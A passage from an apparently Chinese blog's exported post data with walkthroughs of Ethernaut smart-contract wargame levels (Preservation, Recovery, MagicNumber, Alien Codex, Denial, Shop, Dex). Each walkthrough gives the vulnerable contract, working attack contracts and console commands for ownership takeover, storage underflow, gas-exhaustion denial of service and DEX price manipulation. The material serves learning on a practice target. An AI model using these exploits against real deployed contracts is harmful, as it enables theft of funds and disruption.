contract.approve(player,web3.utils.toWei('1000000')) // 给自己授权 await contract.transferFrom(player,contract.address,web3.utils.toWei('1000000')) // 向刚部署的第三方合约转钱，清空 player 的 balance 攻击流程：1、获取实例，查看一下当前账户余额，可以看到是25位，那么我们允许的是就是1000000ether， 2、使用approve进行授权 3、通过transferFrom来实施转账，注意默认单位是ether，别出错 4、查看余额，钱包中的代币消失了，快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Preservation第16关练习","slug":"16.Ethernaut-Preservation","date":"2021-07-18T11:28:00.000Z","updated":"2021-08-02T08:27:30.400Z","comments":true,"path":"/Ethernaut/16.Ethernaut-Preservation/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/16.Ethernaut-Preservation/","excerpt":"","text":"Preservation第16关练习要求：此合同使用库存储两个不同时区的两个不同时间，构造函数为每次要存储的库创建两个实例。 而玩家的目标是获取合约的owner权限。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Preservation { //公共图书馆合约 address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; //设置delegatecall的函数签名 bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public { timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; } //设置时区1的时间 function setFirstTime(uint _timeStamp) public { timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } //设置时区2的时间 function setSecondTime(uint _timeStamp) public { timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } } //简单的图书馆合同来设定时间 contract LibraryContract { //存储时间戳 uint storedTime; function setTime(uint _time) public { storedTime = _time; } } 合约分析：先回忆一下 call() 当使用方法是：require(msg.sender.call.value(_weiToWithdraw)()); 则作用是将_weiToWithdraw个以太币发送给msg.sender地址，并且调用msg.sender地址的fallback函数 当使用方法是： bytes4 methodId = bytes4(keccak256(\"increaseAge(string,uint)\"));//函数hash addr.call(methodId,\"jack\",1); 那就是调用了函数increaseAge，并且传入参数是\"jack\",1 call()的返回结果是一个bool，表示是否成功的调用，或者是失败引起了EVM异常。该方法无法直接访问函数返回结果(因为需要事前知道编码和返回结果大小)。 call()的返回结果即使成功，并不能说操作成功了，只是没有出现异常，比如我们第一个例子中，实际是调用到了fallback()函数。 delegatecall()call与delegatecall的功能类似，区别仅在于后者仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。 函数的设计目的是为了使用存储在另一个合约的库代码。 二者执行代码的上下文环境的不同，当使用call调用其它合约的函数时，代码是在被调用的合约的环境里执行，对应的，使用delegatecall进行函数调用时代码则是在调用函数的合约的环境里执行 三种调用方式的异同点 call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。 delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。 callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。 考虑以下因素： Preservation 调用 setTime 的时候，修改的是 Preservation 的存储空间，而非 LibraryContract 的。 setTime 执行的时候，会对 uint 类型的 storedTime 赋值，这实际意味着对存储空间中的 slot 0 进行赋值。 Preservation 存储空间中 slot 0 存储的是 timeZone1Library，也就是调用 setTime 将会导致 timeZone1Library 被修改。 综合以上 3 点，我们可以将 timeZone1Library 替换为攻击合约。攻击合约沿用上面的思路，构建一个新的 LibraryContract，该合约在调用 setTime 的时候，会修改存储空间中 slot 2 的值（Preservation 的 slot 2 存储的是 owner）。攻击合约如下： pragma solidity ^0.4.25; contract PreservationPoc { address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; function setTime(uint _time) public { owner = address(_time); } } 攻击流程：1、获取实例 2、在remix中部署恶意合约3、在控制台执行一下命令：（恶意合约地址就在部署那里) await contract.setSecondTime('恶意合约地址') await contract.setFirstTime('player地址') 4、这时候合约的拥有者就成了我们自己 5、快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Recovery第17关练习","slug":"17.Ethernaut-Recovery","date":"2021-07-18T08:42:00.000Z","updated":"2021-08-02T08:27:30.400Z","comments":true,"path":"/Ethernaut/17.Ethernaut-Recovery/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/17.Ethernaut-Recovery/","excerpt":"","text":"Recovery第17关练习要求：合约的创建者已经构建了一个非常简单的合约示例。任何人都可以轻松地创建新的代币。部署第一个令牌合约后，创建者发送了0.5ether以获取更多token。后来他们失去了合同地址。 如果您可以从丢失的合同地址中恢复（或移除）0.5ether，则此级别将完成。 找出目标合约生成的代币合约，并取出里面的 ETH 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Recovery { //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg.sender, _initialSupply); } } contract SimpleToken { using SafeMath for uint256; // public variables string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string memory _name, address _creator, uint256 _initialSupply) public { name = _name; balances[_creator] = _initialSupply; } // collect ether in return for tokens fallback() external payable { balances[msg.sender] = msg.value.mul(10); } // allow transfers of tokens function transfer(address _to, uint _amount) public { require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender].sub(_amount); balances[_to] = _amount; } // clean up after ourselves function destroy(address payable _to) public { selfdestruct(_to); } } 合约分析：由于在链上所有东西都是透明的，因此合约创建时我们直接查看合约就可以查看到新建立的合约的地址。直接去 Etherscan 找 instance 的交易记录，可以很容易找到代币合约，然后调用其 destroy 函数即可。之后如果要回复token可以借助destory函数来实现，可以构建如下EXP: pragma solidity ^0.4.23; contract SimpleToken { // public variables string public name; mapping (address =&gt; uint) public balances; // collect ether in return for tokens function() public payable ; // allow transfers of tokens function transfer(address _to, uint _amount) public ; // clean up after ourselves function destroy(address _to) public ; } contract RecoveryPoc { SimpleToken target; constructor(address _addr) public{ target = SimpleToken(_addr); } function attack() public{ target.destroy(tx.origin); } } 攻击流程：1、获取新实例，查看合约地址 2、在meta mask中从etherscan中查看刚刚获取实例时的合约交互，查看Internal Txns 3、可以观察发现我们的帐户给了他 1 ether，然后他又给了另一个地址 0.5 ether，这就是新创建的合约的地址，我们只需要调用新建的这个合约的 destory。 4、在remix中部署RecoveryPoc，将新地址复制出来 5、点击attack，查看交易详情 6、有看到TRANSFER和SELF DESTRUCT，新合约把0.5的eth退还给我们，同时开启了自毁程序 7、冲冲冲，快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"MagicNumber第18关练习","slug":"18.Ethernaut-MagicNumber","date":"2021-07-18T06:12:00.000Z","updated":"2021-08-02T08:27:30.401Z","comments":true,"path":"/Ethernaut/18.Ethernaut-MagicNumber/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/18.Ethernaut-MagicNumber/","excerpt":"","text":"MagicNumber第18关练习要求：为了解决这个问题，你只需要为以太坊提供一个“Solver”，一个用正确数字响应“whatIsTheMeaningOfLife()”的合约。 容易吧？嗯……有一个问题。 求解器的代码需要非常小。真的好小。就像 freakin’ 真的非常非常小：最多 10 个操作码。 提示：也许是时候暂时离开 Solidity 编译器的舒适区，并手动构建这个 O_o。没错：原始 EVM 字节码。 部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract MagicNum { address public solver; constructor() public {} function setSolver(address _solver) public { solver = _solver; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } 合约分析：先看这个 参考Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes | by Nicole Zhu | Coinmonks | Medium 参考 https://f3real.github.io/Ethernaut_wargame19.html 图片来自于https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 先看一下 contract creation 期间会发生什么：1、首先，用户或合约将交易发送到以太网网络。此交易包含数据，但没有 to 地址，表明这是一个合约创建，而不是一个 send/call transaction2、其次，EVM 将 Solidity（高级语言）的合约代码编译为 bytecode（底层的机器语言），该 bytecode 直接转换为 opcodes ，在单个调用堆栈中运行 需要注意的是：contract creation 的 bytecode 包含两部分：initialization code 和 runtime code 3、在 contract creation 期间，EVM 仅执行 initialization code 直到到达堆栈中的第一条 STOP 或 RETURN 指令，在此阶段，合约的 constructor() 会被运行，合约便有地址了 在运行 initialization code 后，只有 runtime code 在堆栈上，然后将这些 opcode 拷贝 到 memory 并返回到 EVM 4、最后，EVM 将 runtime code 返回的 opcode 存储在 state storage ，并与新的合约地址相关联，在将来对新合约的调用时，这些 runtime code 将被执行 所以为了解决该题，我们需要initialization opcodes和runtime codes initialization opcodes: 由 EVM 运行创建合约并存储将来要用的 runtime codes runtime codes: 包含所需的实际执行逻辑。对于本题来说，这是应该返回的代码的主要部分，应该 return 42 并且 under 10 opcodes 1、先来看 runtime codes : 返回值由 return(p, s) 操作码处理，但是在返回值之前，必须先存储在内存中，使用 mstore(p, v) 将 42 存储在内存中 首先，使用 mstore(p, v) 将 42 存储在内存中，其中 p 是在内存中的存储位置， v 是十六进制值，42 的十六进制是 0x2a 0x602a ;PUSH1 0x2a v 0x6080 ;PUSH1 0x80 p 0x52 ;MSTORE 然后，使用 return(p, s) 返回 0x2a ，其中 p 是值 0x2a 存储的位置，s 是值 0x2a 存储所占的大小 0x20 ，占32字节 0x6020 ;PUSH1 0x20 s 0x6080 ;PUSH1 0x80 p 0xf3 ;RETURN 所以 runtime codes 应该是 602a60805260206080f3 ，正好 10 opcodes 2、再来看 initialization codes : 首先，initialization codes 需要先将 runtime codes 拷贝到内存，然后再将其返回到 EVM 。将代码从一个地方复制到另一个地方是 codecopy(t, f, s) 操作码。t 是代码的目标位置，f 是 runtime codes 的当前位置，s 是代码的大小，以字节为单位，对于 602a60805260206080f3 就是 10 bytes ;copy bytecode to memory 0x600a ;PUSH1 0x0a S(runtime code size) 0x60?? ;PUSH1 0x?? F(current position of runtime opcodes) 0x6000 ;PUSH1 0x00 T(destination memory index 0) 0x39 ;CODECOPY 然后，需要将内存中的 runtime codes 返回到 EVM ;return code from memory to EVM 0x600a ;PUSH1 0x0a S 0x6000 ;PUSH1 0x00 P 0xf3 ;RETURN initialization codes 总共占了 0x0c 字节，这表示 runtime codes 从索引 0x0c 开始，所以 ?? 的地方是 0x0c 所以，initialization codes 最后的顺序是 600a600c600039600a6000f3 所以，opcodes最后的顺序是 0x600a600c600039600a6000f3602a60805260206080f3 对于操作码的执行我们需要用转账函数： web3.eth.sendTransaction({from:player,data:bytecode},function(err,res){console.log(res)}) 然后点击查看新合约地址，得到 Contract address，再调用合约中的setSolver(“新合约地址”);就可以了 最终攻击代码如下： var bytecode = \"0x600a600c600039600a6000f3602A60805260206080f3\"; web3.eth.sendTransaction({from:player, data:bytecode}, function(err,res){console.log(res)}); // 通关 Etherscan 得到合约地址 contractAddress await contract.setSolver(\"新的合约地址\"); 攻击流程：1、获取新实例，将代码输入 2、执行操作码转账函数 3、在etherscan上找到新合约地址 4、调用函数，冲！提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Alien Codex第19关练习","slug":"19.Ethernaut-Alien Codex","date":"2021-07-18T01:15:00.000Z","updated":"2021-08-02T08:27:30.401Z","comments":true,"path":"/Ethernaut/19.Ethernaut-Alien Codex/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/19.Ethernaut-Alien%20Codex/","excerpt":"","text":"Alien Codex第19关练习要求：获取合约的所有权 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.5.0; import '../helpers/Ownable-05.sol'; contract AlienCodex is Ownable { bool public contact;//布尔型变量contact bytes32[] public codex; modifier contacted() { assert(contact); _;//函数修饰符,要通过contact必须要是true } function make_contact() public { contact = true;//可以通过这个函数,使得contact变为true } function record(bytes32 _content) contacted public { codex.push(_content); }//增加数组长度 function retract() contacted public { codex.length--; }//减少数组长度 function revise(uint i, bytes32 _content) contacted public { codex[i] = _content; }//修改数组里的内容 } 合约分析：该合约的 owner 字段定义在 Ownable 中，存储在 slot 0，我们的目标就是替换 slot 0 中的数据。注意以下几点： 目标合约定义了一个叫 codex 的 bytes32[] 类型的数组，我们可以向该数组中添加/修改数据，还可以修改数组的长度 在 Solidity 中，插槽数组大小为 2**256，codex 中的元素为 bytes32 类型，所以一个元素会占据一个 slot 在 Solidity 中，(2**256 - 1) + 1 = 0 各个字段在 Storage 中的布局： address _owner: slot 0, 20 bytes bool contact: slot 0, 8 bytes length of codex: slot 1, 32 bytes codex elements: start from slot keccak256(1) 综合这些信息不难想到，我们可以通过让 codex 溢出来访问到 slot 0。Storage 的情况可以使用 remix 的 Debug 功能来观察、验证。 具体的攻击步骤如下： contract.make_contact() contract.retract() // 该步骤使得 codex.length 溢出，codex.length == 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff // codex 的第一个元素应该位于 keccak256(abi.encodePacked(1)) == 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，该 slot 到 slot 0 的距离为: // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1 // 结果为 35707666377435648211887908874984608119992236509074197713628505308453184860938 contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x000000000000000000000000·34DC7d4F5E3512B66271Ce64198c20DFD8B53897这里替换玩家的地址·') // 注意 player 需要添加前置 0，因为 address 是 20 bytes，而 slot 0 存储 32 bytes 攻击流程：1、获取新实例 2、调用make_contact函数 3、调用retract函数 4、使用revise函数让owner变成玩家自己，检查结果 5、快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Denial第20关练习","slug":"20.Ethernaut-Denial","date":"2021-07-16T20:56:00.000Z","updated":"2021-08-02T08:27:30.403Z","comments":true,"path":"/Ethernaut/20.Ethernaut-Denial/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/20.Ethernaut-Denial/","excerpt":"","text":"Denial第20关练习要求：目标：造成 DOS 使得合约的 owner 在调用 withdraw 时无法正常提取资产 要求就是在调用 withdraw 时，禁止 owner 转走账户的 1% 的余额 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Denial { using SafeMath for uint256; address public partner; // withdrawal partner - pay the gas, split the withdraw address payable public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public { partner = _partner; } // withdraw 1% to recipient and 1% to owner function withdraw() public { uint amountToSend = address(this).balance.div(100); // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call.value(amountToSend)(\"\"); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend); } // allow deposit of funds fallback() external payable {} // convenience function function contractBalance() public view returns (uint) { return address(this).balance; } } 合约分析：从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。 可以使 transfer 失败，也就是把 gas 耗光 使用 assert 失败的话，将会 spend all gas ，这样的话 owner.transfer(amountToSend) 将执行失败 这里还有一个很明显的重入漏洞 partner.call.value(amountToSend)() ，利用重入漏洞把 gas 消耗完，应该也可以达到目的 主要思路是，让合约在执行时消耗完所有 gas，交易失败。所以我们可以构建这样的攻击合约 顺带提一下把gas耗光的情况，assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了 pragma solidity ^0.4.23; contract Denial { address public partner; address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; function setWithdrawPartner(address _partner) public { partner = _partner; } function withdraw() public { uint amountToSend = address(this).balance/100; partner.call.value(amountToSend)(); owner.transfer(amountToSend); timeLastWithdrawn = now; withdrawPartnerBalances[partner] += amountToSend; } function() payable {} function contractBalance() view returns (uint) { return address(this).balance; } } contract Attack{ address instance_address = 题目合约地址; Denial target = Denial(instance_address); function hack() public { target.setWithdrawPartner(address(this)); target.withdraw(); } function () payable public { assert(0==1); } } 攻击流程：1、获取新实例， 2、部署合约，复制合约中的地址 pragma solidity ^0.4.23; contract Denial { address public partner; address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; function setWithdrawPartner(address _partner) public { partner = _partner; } function withdraw() public { uint amountToSend = address(this).balance/100; partner.call.value(amountToSend)(); owner.transfer(amountToSend); timeLastWithdrawn = now; withdrawPartnerBalances[partner] += amountToSend; } function() payable {} function contractBalance() view returns (uint) { return address(this).balance; } } contract Attack{ address instance_address = 题目合约地址; Denial target = Denial(instance_address); function hack() public { target.setWithdrawPartner(address(this)); target.withdraw(); } function () payable public { target.withdraw(); } } 3、编译运行，直接hack 4、直接提交就行","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Shop第21关练习","slug":"21.Ethernaut-Shop","date":"2021-07-16T18:24:00.000Z","updated":"2021-08-02T08:27:30.403Z","comments":true,"path":"/Ethernaut/21.Ethernaut-Shop/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/21.Ethernaut-Shop/","excerpt":"","text":"Shop第21关练习要求：实现一个函数，使得两次调用返回值不同 要求是修改 price 低于 100， 那就第一次返回大于100，第二次返回小于100。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface Buyer { function price() external view returns (uint); } contract Shop { uint public price = 100; bool public isSold; function buy() public { Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) { isSold = true; price = _buyer.price.gas(3000)(); } } } 合约分析：本关原理跟11. Elevator相差不大，关卡合約中分別呼叫了两次Buyer合约的price函数，只要第二次呼叫回传的数字比第一次呼叫回传的数字小即可。 本来想的是利用 storage 修改，可是修改变量需要 5000 gas，但是关卡合约使用call呼叫price函数是自定义了一个非常少的gas，只有 3000，这个数量不足以更改任何Storage的数值。 观察合约，可以发现两次请求price函数中间有这个代码︰ isSold = true; 因此我们可以利用isSold数值的转变在price函数时候传不同的数字。isSold 是 public 属性，所以可以利用 isSold ，根据 isSold 进行判断，两次调用 _buyer.price.gas(3000)() 第一次返回大于等于 100 ，第二次返回小于 100 即可 因为gas数量实在是太低了，Solidity 0.8有可能会因为版本原因导致gas使用完而失败，因此以下采用Solidity 0.7进行编写。 攻击流程：1、获取新实例，查看合约地址，是否卖出，价格 2、部署合约，复制地址 pragma solidity ^0.5.0; interface Buyer { function price() external view returns (uint); } contract Shop { uint public price = 100; bool public isSold; function buy() public { Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) { isSold = true; price = _buyer.price.gas(3000)(); } } } interface IShop { function isSold() external view returns (bool); function buy() external; } contract ShopAttack { address levelInstance; constructor(address _levelInstance) public { levelInstance = _levelInstance; } function price() public view returns (uint256) { return IShop(msg.sender).isSold() ? 0 : 100; } function buy() public { IShop(levelInstance).buy(); } } 3、编译执行攻击合约，点击买下来，这里执行成功表示我们是满足了合约要求的3000gas，若不成功表示gas过大 4、检查是否卖出，价格 5、快乐提交吧！","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Dex第22关练习（超详细图片版）","slug":"22.Ethernaut-Dex","date":"2021-07-16T16:00:00.000Z","updated":"2021-08-02T08:27:30.404Z","comments":true,"path":"/Ethernaut/22.Ethernaut-Dex/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/22.Ethernaut-Dex/","excerpt":"","text":"Dex第22关练习（超详细图片版）要求：这个级别的目标是让你破解下面的基本DEX合约，通过价格操纵窃取资金。 玩家最开始有10个Token1和10个Token2，DEX合同最开始有100个Token和100个Token2。 如果让两个Token至少1个被取光，即让至少一个Token为零，并知道这期间会有一个“报错”，您将在该级别获得成功。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Dex { using SafeMath for uint; address public token1; address public token2; constructor(address _token1, address _token2) public { token1 = _token1; token2 = _token2; } function swap(address from, address to, uint amount) public {//swap()函数 需要传入一个from地址，一个to地址，以及一个余额 require(IERC20(from).balanceOf(msg.sender) &gt;= amount, \"Not enough to swap\");//先会判断玩家对应的from地址的值要&gt;=amount，不然不足以交换 uint swap_amount = get_swap_price(from, to, amount);//定义一个交换的余额值作为to的swap_amount,使用的方式是`get_swap_price` IERC20(from).transferFrom(msg.sender, address(this), amount);//进行from地址的交换 IERC20(to).approve(address(this), swap_amount);//允许to地址的交换 IERC20(to).transferFrom(address(this), msg.sender, swap_amount);//进行to地址的交换 } function add_liquidity(address token_address, uint amount) public{ IERC20(token_address).transferFrom(msg.sender, address(this), amount); } function get_swap_price(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));//通过from和to的地址对应的this(即instance)地址和amount值进行计算出并返回一个新的数值 } function approve(address spender, uint amount) public { SwappableToken(token1).approve(spender, amount); SwappableToken(token2).approve(spender, amount); }//允许合约地址进行交易 function balanceOf(address token, address account) public view returns (uint){ return IERC20(token).balanceOf(account);//查询对应token地址的余额 } } contract SwappableToken is ERC20 { constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) { _mint(msg.sender, initialSupply); } } 合约分析：先了解一下： Decentralized exchange(DEX) ERC20 批准/允许解释 ERC20 Token之间如何“交换”？ 我们的目的是让一个TKN成为0，在官网上也可以看到过关条件 若对**IERC20.sol ** ERC20.sol还不是很了解的话可以参考： IERC20.sol ERC20.sol 回到题目，我们重点需要看这个函数： function get_swap_price(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); } 两种Token的合约初始余额均为 100。 利用get_swap_price()计算合约的Token剩余的值。 (amount *IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)) 这将返回相同的交换价格，即 10 个 token1 可以交换 10 个 token2。要破解此方法，必须打破合约代币余额的平衡。须执行以下步骤以产生更高的互换价格 调用approve()函数授权使用token1余额await contract.approve(instance,Number((await contract.balanceOf(token1address, instance)).toString())) 调用approve()函数授权使用token2的余额 await contract.approve(instance,Number((await contract.balanceOf(token2address, instance)).toString())) 调用swap()函数进行交换await contract.swap(token1address,token2address,Number((await contract.balanceOf(token1address, player)).toString())) 调用swap()函数进行交换await contract.swap(token2address,token1address,Number((await contract.balanceOf(token2address, player)).toString())) 现在，token2中的余额是0，token1中的余额是20，利用swap()函数中的get_swap_price()，让他可以用20个token1来交换24个token2, 重复这些步骤，直到将任一代币的合约余额减少到 0。（注意：您可能会收到此错误ERC20: transfer amount exceeds balance。这是因为合约没有足够的余额用于请求的TKN。可以减少互换金额来处理此问题） 攻击流程：1、获取新实例 2、先熟悉我们部署合约的地址 3、分析合约，了解合约内容，发现合约所需要用到的token地址我们并不知道。 4、结合题目，判断Token地址在部署的时候应该会随之存在，于是我们进入钱包找到刚才的合约，进入etherscan中查找我们所需要的内容 右键，将这两个TKN分别在新标签页打开，拿到我们所需要的值 整理一下，我们现在得到了五个地址给我们备用，加上后面我们可能会用到语句，我将他们先放到此处： player '0x34DC7d4F5E3512B66271Ce64198c20DFD8B53897' instance '0xc177418226c51f09E284A91eD20F293CEAce8772' Contract '0xd991431d8b033ddcb84dad257f4821e9d5b38c33' Token 1 '0xe1f647e443710dde0ed501cdb204b59351c13a37' Token 2 '0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6' Token 1 balanceOf await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',instance或player)//instance和player选择一个 Token 2 balanceOf await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',instance或player) Token 1 approve await contract.approve(instance,Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37', instance)).toString())) from Token 2 to Token 1 swap await contract.swap('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37',Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6', instance或player)).toString())) from Token 1 to Token 2 swap await contract.swap('0xe1f647e443710dde0ed501cdb204b59351c13a37','0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37', instance或player)).toString())) get_swap_price await contract.get_swap_price('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37',Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6', instance)).toString())) 查看四个值 await [Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',instance)).toString()),Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',instance)).toString()),Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',player)).toString()),Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',player)).toString())] TKN 1-&gt;TKN 2 await contract.swap('0xe1f647e443710dde0ed501cdb204b59351c13a37','0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',player)).toString())) await contract.swap('0xe1f647e443710dde0ed501cdb204b59351c13a37','0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','20') TKN 2-&gt;TKN 1 await contract.swap('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37',Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',player)).toString())) await contract.swap('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37','20') 当然也可以赋值给TKN1_address这种，好方法都可以 5、准备好了我们开始吧，先查看一下四个的值并记录下来 Start price manipulating... //最开始:TKN1/DEX：合约中的TKN1，TKN2/DEX：合约中的TKN2，TKN1/PLAYER：玩家的TKN1,TKN2/PLAYER：玩家的TKN2 Balances: TKN1/DEX - 100, TKN2/DEX - 100, TKN1/PLAYER - 10, TKN2/PLAYER - 10 Swap price: TKN2 -&gt; TKN1 - '10' Balances: TKN1/DEX - 90, TKN2/DEX - 110, TKN1/PLAYER - 20, TKN2/PLAYER - 0 Swap price: TKN1 -&gt; TKN2 - '20' Balances: TKN1/DEX - 110, TKN2/DEX - 86, TKN1/PLAYER - 0, TKN2/PLAYER - 24 Swap price: TKN2 -&gt; TKN1 - '24' Balances: TKN1/DEX - 80, TKN2/DEX - 110, TKN1/PLAYER - 30, TKN2/PLAYER - 0 Swap price: TKN1 -&gt; TKN2 - '30' Balances: TKN1/DEX - 110, TKN2/DEX - 69, TKN1/PLAYER - 0, TKN2/PLAYER - 41 Swap price: TKN2 -&gt; TKN1 - '41' Balances: TKN1/DEX - 45, TKN2/DEX - 110, TKN1/PLAYER - 65, TKN2/PLAYER - 0 Swap price: TKN1 -&gt; TKN2 - ’‘ Balances: TKN1/DEX - 90, TKN2/DEX - 0, 